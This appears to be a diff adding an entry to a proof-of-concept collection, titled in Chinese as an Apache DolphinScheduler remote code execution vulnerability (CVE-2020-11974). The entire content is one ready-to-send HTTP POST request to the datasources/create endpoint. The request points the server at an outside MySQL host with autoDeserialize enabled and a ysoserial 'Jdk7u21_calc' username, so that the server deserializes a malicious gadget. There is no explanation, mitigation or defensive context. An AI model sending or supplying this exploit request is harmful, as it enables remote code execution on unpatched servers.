@@ -1,0 +1,13 @@
+# Apache DolphinScheduler远程代码执行漏洞(CVE-2020-11974)
+POST /dolphinscheduler/datasources/create?qhaeshs=7152636112232513537 HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 195
+
+type=MYSQL&name=test7&note=&host=172.16.107.13&port=3306&database=test&principal=&userName=yso_Jdk7u21_calc&password=root&connectType=&other={"detectCustomCollations":true,"autoDeserialize":true}
